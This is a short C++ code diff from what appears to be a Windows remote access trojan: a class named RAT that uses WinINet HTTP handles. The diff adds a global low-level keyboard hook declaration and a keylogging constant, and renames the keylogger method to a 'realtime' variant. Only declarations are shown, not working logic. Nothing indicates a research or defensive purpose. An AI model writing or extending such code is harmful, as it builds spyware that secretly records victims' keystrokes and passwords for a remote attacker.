@@ -22,6 +22,10 @@ namespace HTTPInfo {
 	}
 }
 
+namespace Keylogging {
+	constexpr int ALL_THREADS = 0;
+}
+
 struct HINTERNETDeleter {
 	typedef HINTERNET pointer;
 
@@ -34,8 +38,10 @@ struct HINTERNETDeleter {
 
 using HINTERNETWrapper = std::unique_ptr<HINTERNET, HINTERNETDeleter>;
 
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
 class RAT {
 public:
 	RAT() = default;
-	void startKeylogger();
+	void startRealtimeKeylogger();
 };
